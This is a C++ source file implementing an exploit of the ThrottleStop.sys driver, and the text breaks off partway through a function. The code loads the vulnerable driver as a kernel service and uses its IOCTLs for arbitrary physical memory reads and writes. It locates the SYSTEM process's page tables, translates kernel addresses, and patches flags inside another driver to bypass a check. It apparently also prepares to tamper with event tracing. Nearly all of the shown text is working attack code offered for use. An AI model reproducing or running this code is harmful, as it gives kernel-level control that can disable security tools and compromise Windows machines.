/**
 * @file throttlestop_exploit.cpp
 * @brief ThrottleStop.sys exploitation implementation
 */

#include "throttlestop_exploit.h"
#include "../debug.h"
#include <cstdio>
#include <cstdarg>
#include <memory>

// NT types for NtQuerySystemInformation
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef NTSTATUS(NTAPI* PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

constexpr ULONG SystemModuleInformation = 11;

namespace throttlestop {

//-----------------------------------------------------------------------------
// Constructor / Destructor
//-----------------------------------------------------------------------------

ThrottleStopExploit::ThrottleStopExploit()
    : m_hDevice(INVALID_HANDLE_VALUE)
    , m_hSCManager(nullptr)
    , m_hService(nullptr)
    , m_bInitialized(false)
    , m_bDriverDeployed(false)
    , m_SystemCr3(0)
    , m_EtwSavedValue(0)
{
}

ThrottleStopExploit::~ThrottleStopExploit()
{
    Cleanup();
}

//-----------------------------------------------------------------------------
// Error Handling
//-----------------------------------------------------------------------------

void ThrottleStopExploit::SetError(const char* format, ...)
{
    char buffer[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    m_LastError = buffer;
    DbgLog("[ThrottleStop] ERROR: %s", buffer);
}

//-----------------------------------------------------------------------------
// Static: Get Driver Base Address
//-----------------------------------------------------------------------------

uint64_t ThrottleStopExploit::GetDriverBase(const wchar_t* driverName)
{
    DbgLog("[ThrottleStop] GetDriverBase: Looking for driver '%ls'", driverName);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        DbgLog("[ThrottleStop] GetDriverBase: Failed to get ntdll.dll handle");
        return 0;
    }

    auto NtQuerySystemInformation = reinterpret_cast<PFN_NtQuerySystemInformation>(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));
    if (!NtQuerySystemInformation) {
        DbgLog("[ThrottleStop] GetDriverBase: NtQuerySystemInformation not found");
        return 0;
    }

    ULONG cbNeeded = 0;
    NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &cbNeeded);
    if (cbNeeded == 0) {
        DbgLog("[ThrottleStop] GetDriverBase: SystemModuleInformation query failed");
        return 0;
    }

    DbgLog("[ThrottleStop] GetDriverBase: Allocating %lu bytes for module list", cbNeeded);

    std::vector<uint8_t> buffer(cbNeeded + 0x1000);
    auto pModules = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer.data());

    if (NtQuerySystemInformation(SystemModuleInformation, pModules,
                                  static_cast<ULONG>(buffer.size()), &cbNeeded) < 0) {
        DbgLog("[ThrottleStop] GetDriverBase: Failed to enumerate modules");
        return 0;
    }

    DbgLog("[ThrottleStop] GetDriverBase: Found %lu loaded modules", pModules->NumberOfModules);

    // Convert wide string to narrow for comparison
    char szDriverName[256] = {0};
    WideCharToMultiByte(CP_ACP, 0, driverName, -1, szDriverName, sizeof(szDriverName), nullptr, nullptr);
    _strlwr_s(szDriverName);

    for (ULONG i = 0; i < pModules->NumberOfModules; i++) {
        const char* pFullPath = reinterpret_cast<const char*>(pModules->Modules[i].FullPathName);
        const char* pFileName = pFullPath + pModules->Modules[i].OffsetToFileName;

        char szFileName[256];
        strncpy_s(szFileName, pFileName, _TRUNCATE);
        _strlwr_s(szFileName);

        if (strstr(szFileName, szDriverName) != nullptr) {
            uint64_t base = reinterpret_cast<uint64_t>(pModules->Modules[i].ImageBase);
            DbgLog("[ThrottleStop] GetDriverBase: Found '%s' at base 0x%016llX (size: 0x%X)",
                   pFileName, base, pModules->Modules[i].ImageSize);
            return base;
        }
    }

    DbgLog("[ThrottleStop] GetDriverBase: Driver '%ls' NOT FOUND", driverName);
    return 0;
}

//-----------------------------------------------------------------------------
// Service Management
//-----------------------------------------------------------------------------

bool ThrottleStopExploit::CreateDriverService(const std::wstring& driverPath)
{
    m_hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!m_hSCManager) {
        SetError("OpenSCManager failed: %lu", GetLastError());
        return false;
    }

    // Generate unique service name to avoid conflicts
    m_ServiceName = L"ThrottleStop_Ombra_";
    m_ServiceName += std::to_wstring(GetTickCount64());

    m_hService = CreateServiceW(
        m_hSCManager,
        m_ServiceName.c_str(),
        m_ServiceName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driverPath.c_str(),
        nullptr,
        nullptr,
        nullptr,
        nullptr,
        nullptr
    );

    if (!m_hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            // Try to open existing service
            m_hService = OpenServiceW(m_hSCManager, m_ServiceName.c_str(), SERVICE_ALL_ACCESS);
            if (!m_hService) {
                SetError("Service exists but OpenService failed: %lu", GetLastError());
                return false;
            }
        } else {
            SetError("CreateService failed: %lu", err);
            return false;
        }
    }

    DbgLog("[ThrottleStop] Service created: %ls", m_ServiceName.c_str());
    return true;
}

bool ThrottleStopExploit::StartDriverService()
{
    if (!m_hService) {
        SetError("No service handle");
        return false;
    }

    if (!StartServiceW(m_hService, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            DbgLog("[ThrottleStop] Service already running");
            return true;
        }
        SetError("StartService failed: %lu", err);
        return false;
    }

    DbgLog("[ThrottleStop] Service started");
    m_bDriverDeployed = true;
    return true;
}

bool ThrottleStopExploit::StopDriverService()
{
    if (!m_hService) return true;

    SERVICE_STATUS status = {};
    if (!ControlService(m_hService, SERVICE_CONTROL_STOP, &status)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_NOT_ACTIVE) {
            DbgLog("[ThrottleStop] StopService failed: %lu", err);
            // Don't return false - continue with cleanup
        }
    }

    // Wait for service to stop
    for (int i = 0; i < 10; i++) {
        if (QueryServiceStatus(m_hService, &status)) {
            if (status.dwCurrentState == SERVICE_STOPPED) {
                DbgLog("[ThrottleStop] Service stopped");
                return true;
            }
        }
        Sleep(100);
    }

    return true;
}

bool ThrottleStopExploit::DeleteDriverService()
{
    if (!m_hService) return true;

    if (!DeleteService(m_hService)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) {
            DbgLog("[ThrottleStop] DeleteService failed: %lu", err);
        }
    }

    CloseServiceHandle(m_hService);
    m_hService = nullptr;

    if (m_hSCManager) {
        CloseServiceHandle(m_hSCManager);
        m_hSCManager = nullptr;
    }

    DbgLog("[ThrottleStop] Service deleted");
    return true;
}

bool ThrottleStopExploit::OpenDevice()
{
    // This driver uses dynamic device naming based on service name
    // Device path is \\.\<ServiceName>
    std::wstring dynamicDevice = L"\\\\.\\" + m_ServiceName;

    DbgLog("[ThrottleStop] Trying dynamic device: %ls", dynamicDevice.c_str());

    m_hDevice = CreateFileW(
        dynamicDevice.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        DbgLog("[ThrottleStop] Device opened: %ls", dynamicDevice.c_str());
        return true;
    }

    DWORD err = GetLastError();
    DbgLog("[ThrottleStop] Dynamic device failed: %lu, trying static names...", err);

    // Fallback: try static device names
    m_hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        DbgLog("[ThrottleStop] Device opened: %ls", DEVICE_NAME);
        return true;
    }

    // Try alternate device name
    m_hDevice = CreateFileW(
        DEVICE_NAME_ALT,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (m_hDevice != INVALID_HANDLE_VALUE) {
        DbgLog("[ThrottleStop] Device opened: %ls", DEVICE_NAME_ALT);
        return true;
    }

    SetError("Failed to open device: %lu", GetLastError());
    return false;
}

//-----------------------------------------------------------------------------
// Initialization
//-----------------------------------------------------------------------------

bool ThrottleStopExploit::Initialize(const std::wstring& driverPath)
{
    DbgLog("[ThrottleStop] ============================================");
    DbgLog("[ThrottleStop] Initialize() starting...");
    DbgLog("[ThrottleStop] ============================================");

    if (m_bInitialized) {
        DbgLog("[ThrottleStop] Already initialized, returning true");
        return true;
    }

    std::wstring actualPath = driverPath;

    // If no path provided, check if driver is already loaded
    if (actualPath.empty()) {
        DbgLog("[ThrottleStop] No driver path provided, checking for existing device...");
        // Try to open existing device first
        if (OpenDevice()) {
            m_bInitialized = true;
            DbgLog("[ThrottleStop] Using existing driver - device opened successfully");
            return true;
        }

        SetError("No driver path provided and driver not already loaded");
        return false;
    }

    DbgLog("[ThrottleStop] Driver path: %ls", actualPath.c_str());
    m_DriverPath = actualPath;

    // Create and start service
    DbgLog("[ThrottleStop] Creating driver service...");
    if (!CreateDriverService(actualPath)) {
        DbgLog("[ThrottleStop] Failed to create driver service");
        return false;
    }

    DbgLog("[ThrottleStop] Starting driver service...");
    if (!StartDriverService()) {
        DbgLog("[ThrottleStop] Failed to start driver service");
        DeleteDriverService();
        return false;
    }

    // Open device
    // Give driver time to initialize
    DbgLog("[ThrottleStop] Waiting 100ms for driver initialization...");
    Sleep(100);

    DbgLog("[ThrottleStop] Opening device...");
    if (!OpenDevice()) {
        DbgLog("[ThrottleStop] Failed to open device");
        StopDriverService();
        DeleteDriverService();
        return false;
    }

    // Mark initialized BEFORE calling GetSystemCr3 (which uses ReadPhysical)
    m_bInitialized = true;

    // Cache system CR3 for later use
    DbgLog("[ThrottleStop] Getting SYSTEM CR3...");
    m_SystemCr3 = GetSystemCr3();
    if (m_SystemCr3 == 0) {
        DbgLog("[ThrottleStop] WARNING: Could not get system CR3 - translation may fail");
    } else {
        DbgLog("[ThrottleStop] SYSTEM CR3 = 0x%016llX", m_SystemCr3);
    }
    DbgLog("[ThrottleStop] ============================================");
    DbgLog("[ThrottleStop] Initialization COMPLETE");
    DbgLog("[ThrottleStop] ============================================");
    return true;
}

//-----------------------------------------------------------------------------
// Physical Memory Primitives - Granular Operations (CVE-2025-7771 compatible)
//-----------------------------------------------------------------------------
//
// CRITICAL: ThrottleStop.sys IOCTL format:
//
// READ (0x80006498):
//   - Input: Just the 8-byte physical address
//   - Output buffer SIZE determines read size (1, 2, 4, or 8 bytes)
//
// WRITE (0x8000649C):
//   - Input: PhysAddr (8 bytes) + Value (1/2/4/8 bytes)
//   - Input buffer SIZE determines write size (9, 10, 12, or 16 bytes)
//   - NO output buffer
//
//-----------------------------------------------------------------------------

bool ThrottleStopExploit::ReadPhysical8(uint64_t physAddr, uint64_t& value)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        m_hDevice,
        IOCTL_PHYS_READ,
        &physAddr,              // Input: just the 8-byte physical address
        sizeof(physAddr),       // Input size: 8 bytes
        &value,                 // Output: where to store the read value
        sizeof(value),          // Output size: 8 bytes (determines read size!)
        &dwReturned,
        nullptr
    );

    if (!result) {
        DWORD err = GetLastError();
        DbgLog("[ThrottleStop] ReadPhysical8 FAILED at PA 0x%016llX: error %lu", physAddr, err);
        return false;
    }

    return true;
}

bool ThrottleStopExploit::ReadPhysical4(uint64_t physAddr, uint32_t& value)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        m_hDevice,
        IOCTL_PHYS_READ,
        &physAddr,              // Input: just the 8-byte physical address
        sizeof(physAddr),       // Input size: 8 bytes
        &value,                 // Output: where to store the read value
        sizeof(value),          // Output size: 4 bytes (determines read size!)
        &dwReturned,
        nullptr
    );

    if (!result) {
        DWORD err = GetLastError();
        DbgLog("[ThrottleStop] ReadPhysical4 FAILED at PA 0x%016llX: error %lu", physAddr, err);
        return false;
    }

    return true;
}

bool ThrottleStopExploit::ReadPhysical2(uint64_t physAddr, uint16_t& value)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        m_hDevice,
        IOCTL_PHYS_READ,
        &physAddr,              // Input: just the 8-byte physical address
        sizeof(physAddr),       // Input size: 8 bytes
        &value,                 // Output: where to store the read value
        sizeof(value),          // Output size: 2 bytes (determines read size!)
        &dwReturned,
        nullptr
    );

    if (!result) {
        DWORD err = GetLastError();
        DbgLog("[ThrottleStop] ReadPhysical2 FAILED at PA 0x%016llX: error %lu", physAddr, err);
        return false;
    }

    return true;
}

bool ThrottleStopExploit::ReadPhysical1(uint64_t physAddr, uint8_t& value)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        m_hDevice,
        IOCTL_PHYS_READ,
        &physAddr,              // Input: just the 8-byte physical address
        sizeof(physAddr),       // Input size: 8 bytes
        &value,                 // Output: where to store the read value
        sizeof(value),          // Output size: 1 byte (determines read size!)
        &dwReturned,
        nullptr
    );

    if (!result) {
        DWORD err = GetLastError();
        DbgLog("[ThrottleStop] ReadPhysical1 FAILED at PA 0x%016llX: error %lu", physAddr, err);
        return false;
    }

    return true;
}

bool ThrottleStopExploit::WritePhysical8(uint64_t physAddr, uint64_t value)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    PHYS_WRITE_REQUEST_8 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        m_hDevice,
        IOCTL_PHYS_WRITE,
        &req,                   // Input: PhysAddr (8) + Value (8) = 16 bytes
        sizeof(req),            // Input size: 16 bytes
        nullptr,                // No output buffer
        0,                      // Output size: 0
        &dwReturned,
        nullptr
    );

    if (!result) {
        DWORD err = GetLastError();
        DbgLog("[ThrottleStop] WritePhysical8 FAILED at PA 0x%016llX: error %lu", physAddr, err);
        return false;
    }

    return true;
}

bool ThrottleStopExploit::WritePhysical4(uint64_t physAddr, uint32_t value)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    PHYS_WRITE_REQUEST_4 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        m_hDevice,
        IOCTL_PHYS_WRITE,
        &req,                   // Input: PhysAddr (8) + Value (4) = 12 bytes
        sizeof(req),            // Input size: 12 bytes
        nullptr,                // No output buffer
        0,                      // Output size: 0
        &dwReturned,
        nullptr
    );

    if (!result) {
        DWORD err = GetLastError();
        DbgLog("[ThrottleStop] WritePhysical4 FAILED at PA 0x%016llX: error %lu", physAddr, err);
        return false;
    }

    return true;
}

bool ThrottleStopExploit::WritePhysical2(uint64_t physAddr, uint16_t value)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    PHYS_WRITE_REQUEST_2 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        m_hDevice,
        IOCTL_PHYS_WRITE,
        &req,                   // Input: PhysAddr (8) + Value (2) = 10 bytes
        sizeof(req),            // Input size: 10 bytes
        nullptr,                // No output buffer
        0,                      // Output size: 0
        &dwReturned,
        nullptr
    );

    if (!result) {
        DWORD err = GetLastError();
        DbgLog("[ThrottleStop] WritePhysical2 FAILED at PA 0x%016llX: error %lu", physAddr, err);
        return false;
    }

    return true;
}

bool ThrottleStopExploit::WritePhysical1(uint64_t physAddr, uint8_t value)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    PHYS_WRITE_REQUEST_1 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        m_hDevice,
        IOCTL_PHYS_WRITE,
        &req,                   // Input: PhysAddr (8) + Value (1) = 9 bytes
        sizeof(req),            // Input size: 9 bytes
        nullptr,                // No output buffer
        0,                      // Output size: 0
        &dwReturned,
        nullptr
    );

    if (!result) {
        DWORD err = GetLastError();
        DbgLog("[ThrottleStop] WritePhysical1 FAILED at PA 0x%016llX: error %lu", physAddr, err);
        return false;
    }

    return true;
}

//-----------------------------------------------------------------------------
// Physical Memory Primitives - Aggregated Operations
//-----------------------------------------------------------------------------

bool ThrottleStopExploit::ReadPhysical(uint64_t physAddr, void* buffer, uint32_t size)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        SetError("Not initialized");
        return false;
    }

    if (!buffer || size == 0) {
        SetError("Invalid buffer or size");
        return false;
    }

    uint8_t* dst = static_cast<uint8_t*>(buffer);
    uint64_t addr = physAddr;
    uint32_t remaining = size;

    // Read in 8-byte chunks
    while (remaining >= 8) {
        uint64_t val;
        if (!ReadPhysical8(addr, val)) {
            SetError("ReadPhysical8 failed at PA 0x%016llX", addr);
            return false;
        }
        memcpy(dst, &val, 8);
        dst += 8;
        addr += 8;
        remaining -= 8;
    }

    // Handle remaining bytes (4, 2, 1)
    if (remaining >= 4) {
        uint32_t val;
        if (!ReadPhysical4(addr, val)) {
            SetError("ReadPhysical4 failed at PA 0x%016llX", addr);
            return false;
        }
        memcpy(dst, &val, 4);
        dst += 4;
        addr += 4;
        remaining -= 4;
    }

    if (remaining >= 2) {
        uint16_t val;
        if (!ReadPhysical2(addr, val)) {
            SetError("ReadPhysical2 failed at PA 0x%016llX", addr);
            return false;
        }
        memcpy(dst, &val, 2);
        dst += 2;
        addr += 2;
        remaining -= 2;
    }

    if (remaining == 1) {
        uint8_t val;
        if (!ReadPhysical1(addr, val)) {
            SetError("ReadPhysical1 failed at PA 0x%016llX", addr);
            return false;
        }
        *dst = val;
    }

    return true;
}

bool ThrottleStopExploit::WritePhysical(uint64_t physAddr, const void* buffer, uint32_t size)
{
    if (!m_bInitialized || m_hDevice == INVALID_HANDLE_VALUE) {
        SetError("Not initialized");
        return false;
    }

    if (!buffer || size == 0) {
        SetError("Invalid buffer or size");
        return false;
    }

    const uint8_t* src = static_cast<const uint8_t*>(buffer);
    uint64_t addr = physAddr;
    uint32_t remaining = size;

    // Write in 8-byte chunks
    while (remaining >= 8) {
        uint64_t val;
        memcpy(&val, src, 8);
        if (!WritePhysical8(addr, val)) {
            SetError("WritePhysical8 failed at PA 0x%016llX", addr);
            return false;
        }
        src += 8;
        addr += 8;
        remaining -= 8;
    }

    // Handle remaining bytes (4, 2, 1)
    if (remaining >= 4) {
        uint32_t val;
        memcpy(&val, src, 4);
        if (!WritePhysical4(addr, val)) {
            SetError("WritePhysical4 failed at PA 0x%016llX", addr);
            return false;
        }
        src += 4;
        addr += 4;
        remaining -= 4;
    }

    if (remaining >= 2) {
        uint16_t val;
        memcpy(&val, src, 2);
        if (!WritePhysical2(addr, val)) {
            SetError("WritePhysical2 failed at PA 0x%016llX", addr);
            return false;
        }
        src += 2;
        addr += 2;
        remaining -= 2;
    }

    if (remaining == 1) {
        if (!WritePhysical1(addr, *src)) {
            SetError("WritePhysical1 failed at PA 0x%016llX", addr);
            return false;
        }
    }

    return true;
}

//-----------------------------------------------------------------------------
// Virtual-to-Physical Translation
//-----------------------------------------------------------------------------

uint64_t ThrottleStopExploit::GetSystemCr3()
{
    // Find SYSTEM EPROCESS and extract DirectoryTableBase (CR3)
    //
    // EPROCESS structure offsets (Windows 10/11):
    // - DirectoryTableBase at offset 0x28 (CR3)
    // - ImageFileName at offset 0x5a8 ("System")
    //
    // Instead of reading 0x600 bytes at once (which ThrottleStop doesn't support),
    // we read only the specific fields we need using 8-byte reads.

    DbgLog("[ThrottleStop] GetSystemCr3: Scanning physical memory for SYSTEM EPROCESS...");

    // Try common physical addresses where SYSTEM EPROCESS is found
    const uint64_t commonAddresses[] = {
        0x1a2000,   // Common on many Windows 10 builds
        0x1a3000,
        0x1a4000,
        0x1a5000,
        0x1a6000,
        0x1a7000,
        0x1a8000,
        0x1a9000,
        0x1aa000,
        0x1ab000,
        0x1ac000,
        0x1ad000,
        0x1ae000,
        0x1af000,
        0x1b0000,
    };

    for (uint64_t baseAddr : commonAddresses) {
        // Read ImageFileName at offset 0x5a8 (8 bytes covers "System\0\0")
        uint64_t imageFileName = 0;
        if (!ReadPhysical8(baseAddr + 0x5a8, imageFileName)) {
            continue;  // Read failed, try next address
        }

        // Check for "System" - little-endian "System" = 0x006d6574737953
        // But we also need to account for null terminator placement
        // "System\0" as bytes: 53 79 73 74 65 6d 00 XX
        // We'll check the first 6 bytes by masking
        const uint64_t systemMask = 0x0000FFFFFFFFFFFF;  // Mask first 6 bytes
        const uint64_t systemStr  = 0x00006d6574737953;  // "System" in little-endian

        if ((imageFileName & systemMask) == systemStr) {
            // Found "System"! Read DirectoryTableBase at offset 0x28
            uint64_t cr3 = 0;
            if (!ReadPhysical8(baseAddr + 0x28, cr3)) {
                DbgLog("[ThrottleStop] Found 'System' at 0x%016llX but failed to read CR3", baseAddr);
                continue;
            }

            // Validate CR3 - must be page-aligned and in valid range
            if ((cr3 & 0xFFF) == 0 && cr3 != 0 && cr3 < 0x200000000000ULL) {
                DbgLog("[ThrottleStop] Found SYSTEM CR3: 0x%016llX at phys 0x%016llX", cr3, baseAddr);
                return cr3;
            }
        }
    }

    DbgLog("[ThrottleStop] SYSTEM not found at common addresses, scanning 1MB-16MB...");

    // Method 2: Scan first 16MB of physical memory
    for (uint64_t baseAddr = 0x100000; baseAddr < 0x1000000; baseAddr += 0x1000) {
        // Read ImageFileName at offset 0x5a8
        uint64_t imageFileName = 0;
        if (!ReadPhysical8(baseAddr + 0x5a8, imageFileName)) {
            continue;
        }

        const uint64_t systemMask = 0x0000FFFFFFFFFFFF;
        const uint64_t systemStr  = 0x00006d6574737953;

        if ((imageFileName & systemMask) == systemStr) {
            uint64_t cr3 = 0;
            if (!ReadPhysical8(baseAddr + 0x28, cr3)) {
                continue;
            }

            if ((cr3 & 0xFFF) == 0 && cr3 != 0 && cr3 < 0x200000000000ULL) {
                DbgLog("[ThrottleStop] Found SYSTEM CR3: 0x%016llX at phys 0x%016llX", cr3, baseAddr);
                return cr3;
            }
        }
    }

    SetError("Could not find SYSTEM process CR3");
    return 0;
}

bool ThrottleStopExploit::TranslateVirtToPhys(uint64_t cr3, uint64_t virtualAddr, uint64_t& physAddr)
{
    DbgLog("[ThrottleStop] TranslateVirtToPhys: VA=0x%016llX CR3=0x%016llX", virtualAddr, cr3);

    if (cr3 == 0) {
        if (m_SystemCr3 == 0) {
            DbgLog("[ThrottleStop] TranslateVirtToPhys: Getting SYSTEM CR3...");
            m_SystemCr3 = GetSystemCr3();
            if (m_SystemCr3 == 0) {
                SetError("No CR3 available for translation");
                return false;
            }
        }
        cr3 = m_SystemCr3;
        DbgLog("[ThrottleStop] TranslateVirtToPhys: Using SYSTEM CR3=0x%016llX", cr3);
    }

    // Extract page table indices
    uint64_t pml4Index = (virtualAddr >> PML4E_SHIFT) & 0x1FF;
    uint64_t pdptIndex = (virtualAddr >> PDPTE_SHIFT) & 0x1FF;
    uint64_t pdIndex   = (virtualAddr >> PDE_SHIFT) & 0x1FF;
    uint64_t ptIndex   = (virtualAddr >> PTE_SHIFT) & 0x1FF;
    uint64_t offset    = virtualAddr & OFFSET_MASK;

    DbgLog("[ThrottleStop] Page table indices: PML4=%llu PDPT=%llu PD=%llu PT=%llu offset=0x%llX",
           pml4Index, pdptIndex, pdIndex, ptIndex, offset);

    // Read PML4E
    uint64_t pml4eAddr = (cr3 & PFN_MASK) + (pml4Index * 8);
    uint64_t pml4e = 0;
    if (!ReadPhysical(pml4eAddr, pml4e)) {
        SetError("Failed to read PML4E at 0x%016llX", pml4eAddr);
        return false;
    }

    DbgLog("[ThrottleStop] PML4E @ 0x%016llX = 0x%016llX (Present=%d)",
           pml4eAddr, pml4e, (pml4e & PAGE_PRESENT) ? 1 : 0);

    if (!(pml4e & PAGE_PRESENT)) {
        SetError("PML4E not present for VA 0x%016llX", virtualAddr);
        return false;
    }

    // Read PDPTE
    uint64_t pdpteAddr = (pml4e & PFN_MASK) + (pdptIndex * 8);
    uint64_t pdpte = 0;
    if (!ReadPhysical(pdpteAddr, pdpte)) {
        SetError("Failed to read PDPTE at 0x%016llX", pdpteAddr);
        return false;
    }

    DbgLog("[ThrottleStop] PDPTE @ 0x%016llX = 0x%016llX (Present=%d, Large=%d)",
           pdpteAddr, pdpte, (pdpte & PAGE_PRESENT) ? 1 : 0, (pdpte & PAGE_LARGE) ? 1 : 0);

    if (!(pdpte & PAGE_PRESENT)) {
        SetError("PDPTE not present for VA 0x%016llX", virtualAddr);
        return false;
    }

    // Check for 1GB page
    if (pdpte & PAGE_LARGE) {
        physAddr = (pdpte & 0x000FFFFFC0000000ULL) | (virtualAddr & 0x3FFFFFFFULL);
        DbgLog("[ThrottleStop] TranslateVirtToPhys: 1GB PAGE -> PA=0x%016llX", physAddr);
        return true;
    }

    // Read PDE
    uint64_t pdeAddr = (pdpte & PFN_MASK) + (pdIndex * 8);
    uint64_t pde = 0;
    if (!ReadPhysical(pdeAddr, pde)) {
        SetError("Failed to read PDE at 0x%016llX", pdeAddr);
        return false;
    }

    DbgLog("[ThrottleStop] PDE @ 0x%016llX = 0x%016llX (Present=%d, Large=%d)",
           pdeAddr, pde, (pde & PAGE_PRESENT) ? 1 : 0, (pde & PAGE_LARGE) ? 1 : 0);

    if (!(pde & PAGE_PRESENT)) {
        SetError("PDE not present for VA 0x%016llX", virtualAddr);
        return false;
    }

    // Check for 2MB page
    if (pde & PAGE_LARGE) {
        physAddr = (pde & 0x000FFFFFFFE00000ULL) | (virtualAddr & 0x1FFFFFULL);
        DbgLog("[ThrottleStop] TranslateVirtToPhys: 2MB PAGE -> PA=0x%016llX", physAddr);
        return true;
    }

    // Read PTE
    uint64_t pteAddr = (pde & PFN_MASK) + (ptIndex * 8);
    uint64_t pte = 0;
    if (!ReadPhysical(pteAddr, pte)) {
        SetError("Failed to read PTE at 0x%016llX", pteAddr);
        return false;
    }

    DbgLog("[ThrottleStop] PTE @ 0x%016llX = 0x%016llX (Present=%d)",
           pteAddr, pte, (pte & PAGE_PRESENT) ? 1 : 0);

    if (!(pte & PAGE_PRESENT)) {
        SetError("PTE not present for VA 0x%016llX", virtualAddr);
        return false;
    }

    // 4KB page
    physAddr = (pte & PFN_MASK) | offset;
    DbgLog("[ThrottleStop] TranslateVirtToPhys: 4KB PAGE -> PA=0x%016llX", physAddr);
    return true;
}

//-----------------------------------------------------------------------------
// -618 Bypass
//-----------------------------------------------------------------------------

bool ThrottleStopExploit::Patch618Flags(uint64_t ld9BoxBase)
{
    DbgLog("[ThrottleStop] ============================================");
    DbgLog("[ThrottleStop] Patch618Flags() - BYPASSING -618 CHECK");
    DbgLog("[ThrottleStop] ============================================");
    DbgLog("[ThrottleStop] Target driver base: 0x%016llX", ld9BoxBase);

    // Flag offsets from CLAUDE.md analysis
    constexpr uint64_t NTOSKRNL_FLAG_OFFSET = 0x4a1a0;
    constexpr uint64_t HAL_FLAG_OFFSET = 0x4a210;

    uint64_t ntoskrnlFlagVA = ld9BoxBase + NTOSKRNL_FLAG_OFFSET;
    uint64_t halFlagVA = ld9BoxBase + HAL_FLAG_OFFSET;

    DbgLog("[ThrottleStop] ntoskrnl flag VA: 0x%016llX (base + 0x%llX)",
           ntoskrnlFlagVA, NTOSKRNL_FLAG_OFFSET);
    DbgLog("[ThrottleStop] hal flag VA: 0x%016llX (base + 0x%llX)",
           halFlagVA, HAL_FLAG_OFFSET);

    // Translate VAs to PAs
    DbgLog("[ThrottleStop] Translating ntoskrnl flag VA to PA...");
    uint64_t ntoskrnlFlagPA = 0;
    uint64_t halFlagPA = 0;

    if (!TranslateVirtToPhys(0, ntoskrnlFlagVA, ntoskrnlFlagPA)) {
        SetError("Failed to translate ntoskrnl flag VA 0x%016llX", ntoskrnlFlagVA);
        return false;
    }
    DbgLog("[ThrottleStop] ntoskrnl flag PA: 0x%016llX", ntoskrnlFlagPA);

    DbgLog("[ThrottleStop] Translating hal flag VA to PA...");
    if (!TranslateVirtToPhys(0, halFlagVA, halFlagPA)) {
        SetError("Failed to translate hal flag VA 0x%016llX", halFlagVA);
        return false;
    }
    DbgLog("[ThrottleStop] hal flag PA: 0x%016llX", halFlagPA);

    // Read current values for logging
    uint8_t currentNtoskrnl = 0, currentHal = 0;
    DbgLog("[ThrottleStop] Reading current flag values...");
    ReadPhysical(ntoskrnlFlagPA, currentNtoskrnl);
    ReadPhysical(halFlagPA, currentHal);
    DbgLog("[ThrottleStop] BEFORE: ntoskrnl=%u (0x%02X) hal=%u (0x%02X)",
           currentNtoskrnl, currentNtoskrnl, currentHal, currentHal);

    // Write 1 to both flags
    uint8_t newValue = 1;
